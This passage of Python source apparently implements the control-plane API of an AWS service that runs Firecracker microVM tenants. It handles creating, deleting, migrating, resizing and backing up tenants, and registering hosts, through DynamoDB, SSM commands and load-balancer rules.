    # vm_num. On contention it returns None and we fall back to pending+scale.
    vm_num = _reserve_host_slot(host, vcpu, mem_mb)
    if vm_num is None:
        # Lost the race / host filled up between selection and reservation.
        # Treat like "no host": persist pending and scale out rather than 500.
        item = {
            "id": tenant_id, "name": name,
            "vcpu": vcpu, "mem_mb": mem_mb,
            "status": "pending",
            "health_failures": 0,
            "config_template": config_template,
            "restore_backup_key": restore_backup_key,
            "tags": tags,
            "created_at": now, "updated_at": now,
        }
        if skills_in is not None:
            item["skills"] = skills_in
        if group_in:
            item["group"] = group_in
        item.update(ttl_fields)
        if sched:
            item["schedule"] = sched
        tenants_table.put_item(Item=item)
        _scale_out()
        _publish_event("tenant.created", tenant_id, {
            "name": name, "vcpu": vcpu, "mem_mb": mem_mb, "status": "pending",
        })
        return _resp(201, {"id": tenant_id, "status": "pending",
                           "message": "host contention, VM will be created when a host is ready"})

    guest_ip = f"{VM_SUBNET_PREFIX}.{vm_num}.2"
    host_port = VM_PORT_BASE + vm_num - 1

    item = {
        "id": tenant_id,
        "name": name,
        "host_id": host["instance_id"],
        "vm_num": vm_num,
        "guest_ip": guest_ip,
        "host_port": host_port,
        "vcpu": vcpu,
        "mem_mb": mem_mb,
        "status": "creating",
        "health_failures": 0,
        "rootfs_version": host.get("rootfs_version", ""),
        "config_template": config_template,
        "restore_backup_key": restore_backup_key,
        "tags": tags,
        "creation_started_at": now,
        "created_at": now,
        "updated_at": now,
    }
    if skills_in is not None:
        item["skills"] = skills_in
    if group_in:
        item["group"] = group_in
    if clone_from:
        item["clone_from"] = clone_from
    # Persist optional TTL fields on the running path too (#48 follow-up).
    item.update(ttl_fields)
    if sched:
        item["schedule"] = sched
    tenants_table.put_item(Item=item)

    # Issue #12 — for clones, snapshot source disks before launching the new VM.
    # clone-data.sh: pause src → cp --sparse data.ext4 + overlay.ext4 → resume src.
    if clone_src:
        src_vm_num = int(clone_src.get("vm_num", 1))
        clone_cmd = (f"/home/ubuntu/clone-data.sh {clone_from} {src_vm_num} "
                     f"{tenant_id} {vm_num}")
        if not _ssm_run(host["instance_id"], clone_cmd, timeout=180):
            # Roll back: undo the host slot reservation + delete tenant row
            _release_host_slot(host["instance_id"], vcpu, mem_mb)
            tenants_table.update_item(
                Key={"id": tenant_id},
                UpdateExpression="SET #s = :s, updated_at = :t",
                ExpressionAttributeNames={"#s": "status"},
                ExpressionAttributeValues={":s": "deleted", ":t": _now()},
            )
            return _resp(502, {"error": "clone-data.sh failed; tenant rolled back"})

    _launch_vm(host["instance_id"], tenant_id, vm_num, vcpu, mem_mb, guest_ip, host_port, config_template, restore_backup_key,
               scoped_skills=_resolve_effective_skills(item))

    # ALB path-based routing
    tg_arn = _ensure_host_tg(host["instance_id"], host["private_ip"])
    _add_alb_rule(tenant_id, tg_arn)

    _publish_event("tenant.created", tenant_id, {
        "name": name, "vcpu": vcpu, "mem_mb": mem_mb,
        "host_id": host["instance_id"], "guest_ip": guest_ip,
    })

    return _resp(201, {
        "id": tenant_id, "host_id": host["instance_id"],
        "guest_ip": guest_ip, "host_port": host_port, "status": "creating",
    })


def delete_tenant(tenant_id, query_params):
    item = tenants_table.get_item(Key={"id": tenant_id}).get("Item")
    if not item:
        return _resp(404, {"error": "tenant not found"})
    if item.get("status") == "deleted":
        return _resp(200, {"id": tenant_id, "status": "deleted"})

    keep_data = query_params.get("keep_data", "true").lower() == "true"
    host_id = item.get("host_id")

    if host_id:
        # Stop VM via SSM
        vm_num = int(item.get("vm_num", 1))
        _ssm_run(host_id, f"/home/ubuntu/stop-vm.sh {tenant_id} {vm_num}")
        # Remove vm.json so host-agent won't try to recover
        _ssm_run(host_id, f"rm -f /data/firecracker-vms/{tenant_id}/vm.json")

    # Remove ALB rule
    _remove_alb_rule(tenant_id)

    if host_id:
        # Remove DNAT rule (best effort)
        _ssm_run(host_id,
            f"sudo iptables -t nat -D PREROUTING -i $(ip route show default | awk '{{print $5}}' | head -1) -p tcp --dport {item.get('host_port',0)} -j DNAT --to-destination {item.get('guest_ip','')}:{VM_PORT_BASE} 2>/dev/null || true"
        )

        if not keep_data:
            _ssm_run(host_id, f"rm -rf /data/firecracker-vms/{tenant_id}")

        # Update host counters
        host_resp = hosts_table.update_item(
            Key={"instance_id": host_id},
            UpdateExpression="SET used_vcpu = used_vcpu - :v, used_mem_mb = used_mem_mb - :m, vm_count = vm_count - :one",
            ExpressionAttributeValues={
                ":v": item["vcpu"], ":m": item["mem_mb"], ":one": 1,
            },
            ReturnValues="ALL_NEW",
        )
        # Record idle_since when host becomes empty (defensive — mocks may
        # omit Attributes; treat as still-busy and skip).
        attrs = host_resp.get("Attributes") if isinstance(host_resp, dict) else None
        if attrs and int(attrs.get("vm_count", 0)) == 0:
            hosts_table.update_item(
                Key={"instance_id": host_id},
                UpdateExpression="SET idle_since = :t",
                ExpressionAttributeValues={":t": _now()},
            )

    tenants_table.update_item(
        Key={"id": tenant_id},
        UpdateExpression="SET #s = :s, updated_at = :t",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":s": "deleted", ":t": _now()},
    )
    _publish_event("tenant.deleted", tenant_id, {"keep_data": keep_data})
    return _resp(200, {"id": tenant_id, "status": "deleted"})


def tenant_action(tenant_id, action, body=None):
    item = tenants_table.get_item(Key={"id": tenant_id}).get("Item")
    if not item:
        return _resp(404, {"error": "tenant not found"})

    # ── Issue #16: live VM resize (hot-add vCPU) ──
    if action == "resize":
        return tenant_resize(tenant_id, body)

    # ── Issue #22: resize-disk (offline grow of data.ext4) ──
    if action == "resize-disk":
        try:
            payload = json.loads(body) if isinstance(body, str) else (body or {})
        except Exception:
            payload = {}
        new_size = payload.get("new_size_mb")
        if not isinstance(new_size, int):
            return _resp(400, {"error": "missing or invalid new_size_mb"})
        current = int(item.get("data_disk_mb", VM_DATA_DISK_MB))
        if new_size <= current:
            return _resp(400, {"error": f"new_size_mb must be larger (current {current}MB); shrink not supported"})
        if new_size > 1024 * 1024:
            return _resp(400, {"error": "new_size_mb exceeds 1 TiB ceiling"})
        host_id = item.get("host_id")
        vm_num = int(item.get("vm_num", 1))
        if not host_id:
            return _resp(400, {"error": "tenant has no host (still pending?)"})
        # Issue #64-class fix: resize-disk.sh was never deployed (same defect
        # as migrate-vm.sh) AND this path was fire-and-forget — it flipped
        # data_disk_mb in DDB before the host had even run the script, so DDB
        # claimed the new size whether or not the ext4 grow actually happened.
        # Now: run synchronously, and only persist the new size on Success.
        if not _ssm_run(host_id,
                        f"/home/ubuntu/resize-disk.sh {tenant_id} {vm_num} {new_size}",
                        timeout=120):
            return _resp(502, {"error": "resize-disk.sh failed on host; size unchanged",
                               "id": tenant_id, "data_disk_mb": current})
        tenants_table.update_item(
            Key={"id": tenant_id},
            UpdateExpression="SET data_disk_mb = :s, updated_at = :t",
            ExpressionAttributeValues={":s": new_size, ":t": _now()},
        )
        return _resp(200, {
            "id": tenant_id, "status": "running",
            "old_size_mb": current, "new_size_mb": new_size,
        })

    if action == "migrate":
        # Live migration via Firecracker snapshot/restore (issue #20).
        # Body shape: {"target_host_id": "i-...."}
        # Issue #72: choose the migration strategy based on balloon state +
        # BALLOON_MIGRATE_MODE. balloon off → live snapshot. balloon on →
        # reject / cold / live per config.
        migrate_mode = "live"  # default for non-balloon tenants
        if BALLOON_ENABLED:
            if BALLOON_MIGRATE_MODE == "reject":
                return _resp(409, {
                    "error": "Live migration is disabled while memory overcommit (balloon) is on (balloon.migrate_mode=reject). Set balloon.migrate_mode to 'cold' (restart-based, always safe) or 'live' (snapshot-based) to enable it.",
                    "reason": "balloon_enabled",
                })
            migrate_mode = "cold" if BALLOON_MIGRATE_MODE == "cold" else "live"
        try:
            payload = json.loads(body) if isinstance(body, str) else (body or {})
        except Exception:
            payload = {}
        target_host_id = payload.get("target_host_id")
        if not target_host_id:
            return _resp(400, {"error": "missing target_host_id"})
        source_host_id = item.get("host_id")
        if target_host_id == source_host_id:
            return _resp(400, {"error": "target_host_id must be different from source"})
        target = hosts_table.get_item(Key={"instance_id": target_host_id}).get("Item")
        if not target:
            return _resp(404, {"error": f"target host {target_host_id} not found"})
        if target.get("status") in ("draining", "deleted"):
            return _resp(409, {"error": f"target host {target_host_id} is {target['status']}"})

        # Capacity check — same allocatable formula as _find_host().
        vcpu = int(item.get("vcpu", 0))
        mem_mb = int(item.get("mem_mb", 0))
        allocatable_vcpu = int(int(target["total_vcpu"]) * CPU_OVERCOMMIT_RATIO)
        free_vcpu = allocatable_vcpu - int(target.get("used_vcpu", 0))
        allocatable_mem = int(int(target["total_mem_mb"]) * MEM_OVERCOMMIT_RATIO)
        free_mem = allocatable_mem - int(target.get("used_mem_mb", 0))
        if free_vcpu < vcpu or free_mem < mem_mb:
            return _resp(409, {"error": (
                f"target host has insufficient capacity "
                f"(free vcpu={free_vcpu}, free mem={free_mem}MB; "
                f"need vcpu={vcpu}, mem={mem_mb}MB)"
            )})

        vm_num = int(item.get("vm_num", 1))
        bucket = os.environ.get("ASSETS_BUCKET", "")
        snap_prefix = f"migrations/{tenant_id}"
        target_vm_num = int(target.get("next_vm_num", 1))
        now = _now()

        # ── Issue #64 — ASYNC, fail-safe migration ──
        # A correct migration runs snapshot(source)+restore(target), which now
        # ship multi-GB disk images and take *minutes*. API Gateway caps a
        # synchronous integration at 29s, so we cannot block here (an earlier
        # synchronous version returned "Endpoint request timed out" and could
        # leave the tenant stuck in `migrating`). Instead:
        #   1. Do all the cheap validation synchronously (done above).
        #   2. Fire-and-forget the snapshot via _ssm_send (returns a CommandId).
        #   3. Record migrating + the async context in DDB and return 202.
        # The health_check Lambda's 5-min sweep (_advance_migration) polls the
        # SSM CommandId, triggers restore when snapshot succeeds, verifies the
        # dashboard through the public path, and only then flips host_id /
        # counters / routing → running. Any failure (or a 15-min watchdog)
        # rolls status back to running with host_id untouched, so the tenant
        # is never left pointing at a host with no VM. The source of truth is
        # only mutated after the whole move is proven — same fail-safe contract
        # as before, just driven out-of-band instead of in the request path.

        # cold mode dumps the (stopped) data volume; live mode snapshots the
        # running VM. The sweep branches on migration_mode for the restore step.
        src_verb = "cold-dump" if migrate_mode == "cold" else "snapshot"
        snap_cmd = _ssm_send(
            source_host_id,
            f"/home/ubuntu/migrate-vm.sh {src_verb} {tenant_id} {vm_num} "
            f"s3://{bucket}/{snap_prefix}",
            timeout=600,   # snapshot/dump + multi-GB disk upload to S3
        )
        if not snap_cmd:
            # Couldn't even submit the SSM command — nothing started, DDB clean.
            return _resp(502, {"error": "failed to start migration (SSM submit)",
                               "id": tenant_id,
                               "source_host_id": source_host_id,
                               "target_host_id": target_host_id})

        # Mark migrating + stash everything the sweep needs to finish the move.
        # No host_id / counter / routing change happens here — only after the
        # sweep proves snapshot+restore+dashboard all succeeded.
        tenants_table.update_item(
            Key={"id": tenant_id},
            UpdateExpression=(
                "SET #s = :s, migration_target = :tgt, "
                "migration_target_vm_num = :tvn, migration_source = :src, "
                "migration_snap_cmd = :scmd, migration_phase = :ph, "
                "migration_mode = :mode, "
                "migration_started_at = :st, migration_snapshot_uri = :uri, "
                "updated_at = :t "
                # Clear any migration_failed left by a PRIOR failed attempt so
                # a fresh migration doesn't inherit a stale failure marker (a
                # poller watching migration_failed would otherwise abort early).
                "REMOVE migration_failed"
            ),
            ExpressionAttributeNames={"#s": "status"},
            ExpressionAttributeValues={
                ":s": "migrating",
                ":tgt": target_host_id,
                ":tvn": target_vm_num,
                ":src": source_host_id,
                ":scmd": snap_cmd,
                ":ph": "snapshot",
                ":mode": migrate_mode,
                ":st": now,
                ":uri": f"s3://{bucket}/{snap_prefix}",
                ":t": now,
            },
        )

        # 202 Accepted: the move is in flight. Clients poll GET /tenants/{id}
        # until status is `running` (success) or back to its prior value with
        # migration_failed set (failure).
        return _resp(202, {
            "id": tenant_id, "status": "migrating", "mode": migrate_mode,
            "source_host_id": source_host_id, "target_host_id": target_host_id,
            "snapshot_uri": f"s3://{bucket}/{snap_prefix}",
            "poll": f"/tenants/{tenant_id}",
        })

    if action == "restart":
        vm_num = int(item.get("vm_num", 1))
        guest_ip = item.get("guest_ip", "")
        host_port = item.get("host_port", "")
        stop_cmd = f"/home/ubuntu/stop-vm.sh {tenant_id} {vm_num}"
        launch_cmd = f"/home/ubuntu/launch-vm.sh {tenant_id} {vm_num} {item['vcpu']} {item['mem_mb']}"
        # Re-add DNAT after restart
        dnat_cmd = (
            f"sudo iptables -t nat -A PREROUTING -i $(ip route show default | awk '{{print $5}}' | head -1) "
            f"-p tcp --dport {host_port} -j DNAT --to-destination {guest_ip}:{VM_PORT_BASE}"
        ) if guest_ip and host_port else ""
        full_cmd = f"{stop_cmd} && sleep 2 && {launch_cmd}"
        if dnat_cmd:
            full_cmd += f" && {dnat_cmd}"
        _ssm_run(item["host_id"], full_cmd, timeout=300)
        new_status = "running"
    elif action == "stop":
        vm_num = int(item.get("vm_num", 1))
        guest_ip = item.get("guest_ip", "")
        host_port = item.get("host_port", "")
        stop_cmd = f"/home/ubuntu/stop-vm.sh {tenant_id} {vm_num}"
        # Remove DNAT rule
        dnat_del = (
            f"sudo iptables -t nat -D PREROUTING -i $(ip route show default | awk '{{print $5}}' | head -1) "
            f"-p tcp --dport {host_port} -j DNAT --to-destination {guest_ip}:{VM_PORT_BASE} 2>/dev/null || true"
        ) if guest_ip and host_port else ""
        full_cmd = stop_cmd
        if dnat_del:
            full_cmd += f" && {dnat_del}"
        _ssm_run(item["host_id"], full_cmd)
        new_status = "stopped"
    elif action == "start":
        vm_num = int(item.get("vm_num", 1))
        guest_ip = item.get("guest_ip", "")
        host_port = item.get("host_port", "")
        launch_cmd = f"/home/ubuntu/launch-vm.sh {tenant_id} {vm_num} {item['vcpu']} {item['mem_mb']}"
        dnat_cmd = (
            f"sudo iptables -t nat -A PREROUTING -i $(ip route show default | awk '{{print $5}}' | head -1) "
            f"-p tcp --dport {host_port} -j DNAT --to-destination {guest_ip}:{VM_PORT_BASE}"
        ) if guest_ip and host_port else ""
        full_cmd = launch_cmd
        if dnat_cmd:
            full_cmd += f" && {dnat_cmd}"
        _ssm_run(item["host_id"], full_cmd, timeout=300)
        new_status = "running"
    elif action == "reset":
        vm_num = int(item.get("vm_num", 1))
        guest_ip = item.get("guest_ip", "")
        host_port = item.get("host_port", "")
        # Stop, delete overlay (force fresh layer), then launch
        stop_cmd = f"/home/ubuntu/stop-vm.sh {tenant_id} {vm_num}"
        reset_cmd = f"rm -f /data/firecracker-vms/{tenant_id}/overlay.ext4"
        launch_cmd = f"/home/ubuntu/launch-vm.sh {tenant_id} {vm_num} {item['vcpu']} {item['mem_mb']}"
        dnat_cmd = (
            f"sudo iptables -t nat -A PREROUTING -i $(ip route show default | awk '{{print $5}}' | head -1) "
            f"-p tcp --dport {host_port} -j DNAT --to-destination {guest_ip}:{VM_PORT_BASE}"
        ) if guest_ip and host_port else ""
        full_cmd = f"{stop_cmd} && {reset_cmd} && sleep 2 && {launch_cmd}"
        if dnat_cmd:
            full_cmd += f" && {dnat_cmd}"
        _ssm_run(item["host_id"], full_cmd, timeout=300)
        new_status = "running"
    elif action == "pause":
        vm_dir = f"/data/firecracker-vms/{tenant_id}"
        _ssm_run(item["host_id"],
            f'curl -s --unix-socket {vm_dir}/fc.sock -X PATCH http://localhost/vm '
            f'-H "Content-Type: application/json" -d \'{{"state":"Paused"}}\'')
        new_status = "paused"
    elif action == "resume":
        vm_dir = f"/data/firecracker-vms/{tenant_id}"
        _ssm_run(item["host_id"],
            f'curl -s --unix-socket {vm_dir}/fc.sock -X PATCH http://localhost/vm '
            f'-H "Content-Type: application/json" -d \'{{"state":"Resumed"}}\'')
        new_status = "running"
    elif action == "backup":
        # Async invoke Backup Lambda with single tenant
        lambda_client = boto3.client("lambda")
        lambda_client.invoke(
            FunctionName=os.environ.get("BACKUP_FUNCTION", "openclaw-backup"),
            InvocationType="Event",  # async, returns immediately
            Payload=json.dumps({"tenant_id": tenant_id}).encode(),
        )
        _publish_event("tenant.backup_started", tenant_id, {})
        return _resp(202, {"id": tenant_id, "action": "backup", "status": "started"})
    else:
        return _resp(400, {"error": f"unknown action: {action}"})

    update_expr = "SET #s = :s, updated_at = :t"
    expr_values = {":s": new_status, ":t": _now()}
    if action == "reset":
        host = hosts_table.get_item(Key={"instance_id": item["host_id"]}).get("Item", {})
        update_expr += ", rootfs_version = :rv"
        expr_values[":rv"] = host.get("rootfs_version", "")

    tenants_table.update_item(
        Key={"id": tenant_id},
        UpdateExpression=update_expr,
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues=expr_values,
    )
    # Issue #13 — publish lifecycle event for the action.
    # Map action verbs to lifecycle event names so consumers can filter.
    _action_to_event = {
        "stop": "tenant.stopped",
        "start": "tenant.started",
        "restart": "tenant.restarted",
        "pause": "tenant.paused",
        "resume": "tenant.resumed",
        "reset": "tenant.reset",
    }
    event_name = _action_to_event.get(action, f"tenant.{new_status}")
    _publish_event(event_name, tenant_id, {"action": action, "status": new_status})
    return _resp(200, {"id": tenant_id, "status": new_status})


def list_backups(tenant_id):
    bucket = os.environ.get("ASSETS_BUCKET", "")
    prefix = os.environ.get("BACKUP_PREFIX", "backups")
    resp = s3.list_objects_v2(Bucket=bucket, Prefix=f"{prefix}/{tenant_id}/")
    backups = []
    for obj in sorted(resp.get("Contents", []), key=lambda o: o["Key"], reverse=True):
        name = obj["Key"].rsplit("/", 1)[-1]
        backups.append({
            "key": obj["Key"],
            "timestamp": name.replace(".gz", ""),
            "size_mb": round(obj["Size"] / 1048576, 1),
        })
    return _resp(200, {"tenant_id": tenant_id, "backups": backups})


def list_all_backups():
    """List all backups across all tenants, left-joined with tenants table to mark orphans."""
    bucket = os.environ.get("ASSETS_BUCKET", "")
    prefix = os.environ.get("BACKUP_PREFIX", "backups")

    # Build tenant_id → (name, exists) map from DDB (include soft-deleted for name resolution)
    tenants = tenants_table.scan().get("Items", [])
    tenant_info = {
        t["id"]: {"name": t.get("name", ""), "exists": t.get("status") != "deleted"}
        for t in tenants
    }

    # Paginate S3 list to avoid missing objects when > 1000 backups exist
    paginator = s3.get_paginator("list_objects_v2")
    backups = []
    for page in paginator.paginate(Bucket=bucket, Prefix=f"{prefix}/"):
        for obj in page.get("Contents", []):
            parts = obj["Key"].split("/")
            # Expect: {prefix}/{tenant_id}/{timestamp}.gz
            if len(parts) < 3 or not parts[-1].endswith(".gz"):
                continue
            src_tenant_id = parts[-2]
            timestamp = parts[-1][:-3]  # strip ".gz"
            info = tenant_info.get(src_tenant_id, {"name": None, "exists": False})
            backups.append({
                "tenant_id": src_tenant_id,
                "tenant_name": info["name"],
                "tenant_exists": info["exists"],
                "timestamp": timestamp,
                "size_bytes": obj["Size"],
                "last_modified": obj["LastModified"].isoformat(),
            })

    backups.sort(key=lambda b: b["last_modified"], reverse=True)
    return _resp(200, backups)


def tenant_get_action(tenant_id, action):
    if action == "backups":
        return list_backups(tenant_id)
    return _resp(400, {"error": f"unknown GET action: {action}"})


# ========== Host Operations ==========


def list_hosts():
    items = hosts_table.scan(
        FilterExpression="#s <> :d",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":d": "deleted"},
    ).get("Items", [])
    # Filter out synthetic records (e.g. __az_failover_state__ used by the
    # health_check Lambda to remember per-AZ cooldown — added in 1.3.0).
    # Anything starting with "__" is reserved for internal bookkeeping and
    # must not appear in user-facing host lists.
    items = [h for h in items if not str(h.get("instance_id", "")).startswith("__")]
    for item in items:
        item["cpu_overcommit_ratio"] = CPU_OVERCOMMIT_RATIO
        item["mem_overcommit_ratio"] = MEM_OVERCOMMIT_RATIO
    return _resp(200, items)


# Same _sizes / _mem_ratio fallback as deploy/stack.py (kept in sync
# manually because both are intentionally tiny constant tables — adding
# a shared module just to dedupe two dicts isn't worth the import cost
# in cold-start). When EC2 describe_instance_types() works this table
# is unused; it only triggers if the API call fails.
_SIZE_TO_VCPU = {"medium": 1, "large": 2, "xlarge": 4, "2xlarge": 8,
                 "4xlarge": 16, "8xlarge": 32, "12xlarge": 48,
                 "16xlarge": 64, "24xlarge": 96}
_FAMILY_LETTER_TO_MEM_PER_VCPU = {"c": 2048, "m": 4096, "r": 8192}


def _resolve_instance_memory_mb(ec2_client, instance_type):
    """Return the advertised RAM (MiB) for an EC2 instance type.

    Tries the authoritative AWS API first (describe_instance_types →
    MemoryInfo.SizeInMiB), falling back to a static lookup table when
    the API call fails (permission, throttling, malformed instance_type).
    The fallback keeps register_host() functional in environments that
    haven't granted ec2:DescribeInstanceTypes, but we log loudly so the
    operator notices.
    """
    if instance_type:
        try:
            resp = ec2_client.describe_instance_types(InstanceTypes=[instance_type])
            return int(resp["InstanceTypes"][0]["MemoryInfo"]["SizeInMiB"])
        except Exception as exc:
            print(f"register_host: ec2.describe_instance_types({instance_type}) "
                  f"failed: {exc}; falling back to static lookup")
    # Fallback: parse e.g. "m8i.xlarge" → family=m, size=xlarge → 4 * 4096 = 16384 MiB
    try:
        family, size = instance_type.split(".")
        vcpu = _SIZE_TO_VCPU[size]
        return vcpu * _FAMILY_LETTER_TO_MEM_PER_VCPU[family[0]]
    except (ValueError, KeyError, IndexError):
        # Last-ditch sane default. Logged so the operator notices.
        print(f"register_host: unable to parse instance_type={instance_type!r}; "
              f"defaulting mem_total to 16384 MiB. Add the type to "
              f"_SIZE_TO_VCPU or grant ec2:DescribeInstanceTypes.")
        return 16384



def register_host(body):
    if body is None:
        return _resp(400, {"error": "missing body"})
    body = json.loads(body) if isinstance(body, str) else body
    instance_id = body.get("instance_id")
    if not instance_id:
        return _resp(400, {"error": "missing instance_id"})

    # Fetch instance info
    ec2 = boto3.client("ec2")
    resp = ec2.describe_instances(InstanceIds=[instance_id])
    inst = resp["Reservations"][0]["Instances"][0]
    private_ip = inst["PrivateIpAddress"]
    instance_type = inst.get("InstanceType", "")
    # Capture the AZ so the console can group/filter hosts and tenants by AZ
    # without an extra describe_instances call. Falls back to "" rather than
    # failing if Placement is missing (would be unusual but defensive).
    az = (inst.get("Placement") or {}).get("AvailabilityZone", "")
    vcpu_total = inst["CpuOptions"]["CoreCount"] * inst["CpuOptions"]["ThreadsPerCore"]

    # Resolve memory from the instance type via the EC2 API rather than
    # hard-coding 16384 (which silently wrote wrong values for any host
    # larger than xlarge — see register_host TODO removed in 1.2.4).
    # describe_instance_types returns SizeInMiB which IS exactly the
    # advertised RAM; we fall back to a heuristic only if the API errors.
    mem_total = _resolve_instance_memory_mb(ec2, instance_type)

    hosts_table.put_item(Item={
        "instance_id": instance_id,
        "private_ip": private_ip,
        "az": az,
        "total_vcpu": vcpu_total - HOST_RESERVED_VCPU,
        "total_mem_mb": mem_total - HOST_RESERVED_MEM,
        "used_vcpu": 0,
        "used_mem_mb": 0,
        "vm_count": 0,
        "next_vm_num": 1,
        "status": "active",
        "idle_since": _now(),
    })
    return _resp(201, {"instance_id": instance_id, "status": "active", "az": az})


def deregister_host(instance_id):
    hosts_table.update_item(
        Key={"instance_id": instance_id},
        UpdateExpression="SET #s = :s",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":s": "draining"},
    )
    # Terminate via ASG API to trigger termination lifecycle hook
    try:
        asg_client.terminate_instance_in_auto_scaling_group(
            InstanceId=instance_id,
            ShouldDecrementDesiredCapacity=False,
        )
    except Exception as e:
        print(f"Failed to terminate {instance_id}: {e}")
    return _resp(200, {"instance_id": instance_id, "status": "draining"})


def cleanup_terminated_host(event):
    """Called by termination lifecycle hook — cleanup DynamoDB then complete hook."""
    detail = event["detail"]
    instance_id = detail["EC2InstanceId"]
    print(f"cleanup_terminated_host: {instance_id}")

    # Delete all tenants on this host
    tenants = tenants_table.scan(
        FilterExpression="host_id = :h AND #s <> :d",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":h": instance_id, ":d": "deleted"},
    ).get("Items", [])
    for t in tenants:
        _remove_alb_rule(t["id"])
        tenants_table.update_item(
            Key={"id": t["id"]},
            UpdateExpression="SET #s = :s, updated_at = :t",
            ExpressionAttributeNames={"#s": "status"},
            ExpressionAttributeValues={":s": "deleted", ":t": _now()},
        )

    # Remove host target group
    _remove_host_tg(instance_id)

    # Delete host
    hosts_table.update_item(
        Key={"instance_id": instance_id},
        UpdateExpression="SET #s = :s, updated_at = :t",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":s": "deleted", ":t": _now()},
    )
    print(f"cleaned up host {instance_id}, {len(tenants)} tenants deleted")

    # Issue #71 — audit the host teardown + tenant reap (non-API actor).
    _audit_system("host.terminated", f"host:{instance_id}", instance_id,
                  actor="system:asg-lifecycle",
                  detail={"instance_id": instance_id,
                          "tenants_reaped": [t["id"] for t in tenants]})

    # Complete lifecycle hook
    try:
        asg_client.complete_lifecycle_action(
            LifecycleHookName=detail["LifecycleHookName"],
            AutoScalingGroupName=detail["AutoScalingGroupName"],
            LifecycleActionResult="CONTINUE",
            InstanceId=instance_id,
        )
    except Exception as e:
        print(f"complete_lifecycle_action failed: {e}")


def rootfs_version():
    manifest = _get_manifest()
    return _resp(200, {"version": manifest.get("version", "unknown")})


def agentcore_status():
    enabled = os.environ.get("AGENTCORE_ENABLED", "false") == "true"
    gateway_url = os.environ.get("AGENTCORE_GATEWAY_URL", "")
    return _resp(200, {
        "enabled": enabled,
        "gateway_url": gateway_url if enabled else None,
    })


# ════════════════════════════════════════════════════════════
# AgentCore tools listing (for console display)
# ════════════════════════════════════════════════════════════
#
# When AgentCore Gateway is enabled, three Lambda-backed MCP tools are
# registered (see deploy/stack.py — tools=hello/system_info/timestamp).
# The console wants to surface this list so operators can see what tools
# their VMs get for free without having to read the CDK code. The list is
# static (defined at deploy time), so the response is hard-coded here
# rather than calling out to bedrock-agentcore at request time — which
# would cost a control-plane API call per page load.
#
# If AgentCore is disabled, we return an empty list with a hint so the
# console can render an "AgentCore not enabled" placeholder.

_AGENTCORE_BUILTIN_TOOLS = [
    {
        "name": "hello",
        "description": "Say hello — test tool for verifying AgentCore Gateway connectivity",
        "input_schema": {
            "type": "object",
            "properties": {"name": {"type": "string", "description": "Name to greet"}},
        },
    },
    {
        "name": "system_info",
        "description": "Get Lambda runtime system information",
        "input_schema": {"type": "object"},
    },
    {
        "name": "timestamp",
        "description": "Get current UTC timestamp",
        "input_schema": {
            "type": "object",
            "properties": {"format": {"type": "string", "description": "iso or unix"}},
        },
    },
]


def agentcore_tools():
    """GET /agentcore/tools — list MCP tools registered with the Gateway.

    Today this is a static list (the tools are defined declaratively in
    stack.py at deploy time). A future PR can replace this with a live
    `bedrock-agentcore.list_targets()` call when the Gateway grows
    user-defined tools.
    """
    enabled = os.environ.get("AGENTCORE_ENABLED", "false") == "true"
    if not enabled:
        return _resp(200, {"enabled": False, "tools": []})
    return _resp(200, {"enabled": True, "tools": _AGENTCORE_BUILTIN_TOOLS})


# ════════════════════════════════════════════════════════════
# System info — feature flags / config snapshot for the console
# ════════════════════════════════════════════════════════════
#
# The console's Settings tab wants to surface "is multi-AZ on?",
# "is metrics on?", "is WAF on?" etc. without parsing config.yml.
# We expose the relevant env-derived flags here so the UI can render
# accurate state without an out-of-band copy of config.yml.

def system_info():
    """GET /system/info — feature flags + config snapshot for the console.

    Returns the subset of stack config the console needs to render
    Settings → Infrastructure: which optional features are enabled, and
    where to find their associated AWS resources (Grafana URL, SNS topic
    ARN, etc.). Values come from env vars wired in stack.py.
    """
    return _resp(200, {
        "version": os.environ.get("PROJECT_VERSION", "dev"),
        "region": os.environ.get("AWS_REGION", ""),
        "agentcore": {
            "enabled": os.environ.get("AGENTCORE_ENABLED", "false") == "true",
            "gateway_url": os.environ.get("AGENTCORE_GATEWAY_URL", "") or None,
        },
        "metrics": {
            "enabled": bool(os.environ.get("AMP_REMOTE_WRITE_URL")),
            "amp_remote_write_url": os.environ.get("AMP_REMOTE_WRITE_URL", "") or None,
            "grafana_url": os.environ.get("GRAFANA_WORKSPACE_URL", "") or None,
        },
        "multi_az": {
            "enabled": os.environ.get("MULTI_AZ_ENABLED", "false") == "true",
            "az_count": int(os.environ.get("MULTI_AZ_COUNT", "1") or "1"),
        },
        "waf": {"enabled": os.environ.get("WAF_ENABLED", "false") == "true"},
        "cognito": {
            # 1.2.9 fix: was checking COGNITO_USER_POOL_ID which is only
            # populated when console_auth.user_pool_id is *explicitly* set
            # in config.yml. The auto-created pool path leaves that env
            # empty even though Cognito IS deployed and the user is
            # actively logged in via OAuth — read CONSOLE_AUTH_ENABLED
            # (driven by config.yml console_auth.enabled) instead.
            "enabled": os.environ.get("CONSOLE_AUTH_ENABLED", "false") == "true",
            "user_pool_id": os.environ.get("COGNITO_USER_POOL_ID", "") or None,
            # 1.5.4: RBAC is an independent switch from login — a deployment can require Cognito login without enforcing per-route role checks.
            "rbac_enabled": RBAC_ENABLED,
        },
        "notifications": {
            "enabled": bool(NOTIFICATIONS_TOPIC_ARN),
            "topic_arn": NOTIFICATIONS_TOPIC_ARN or None,
        },
        "quotas": {
            "enabled": QUOTAS_ENABLED,
            "max_vcpu_per_tenant": QUOTAS_MAX_VCPU,
            "max_mem_mb_per_tenant": QUOTAS_MAX_MEM_MB,
            "max_data_disk_mb": QUOTAS_MAX_DATA_DISK_MB,
        },
        "host_config": {
            "cpu_overcommit_ratio": CPU_OVERCOMMIT_RATIO,
            "mem_overcommit_ratio": MEM_OVERCOMMIT_RATIO,
            "vm_default_vcpu": VM_DEFAULT_VCPU,
            "vm_default_mem_mb": VM_DEFAULT_MEM,
        },
    })


def _get_manifest():
    """Read manifest.json from S3, return dict."""
    bucket = os.environ.get("ASSETS_BUCKET", "")
    prefix = os.environ.get("ROOTFS_PREFIX", "rootfs")
    try:
        obj = s3.get_object(Bucket=bucket, Key=f"{prefix}/manifest.json")
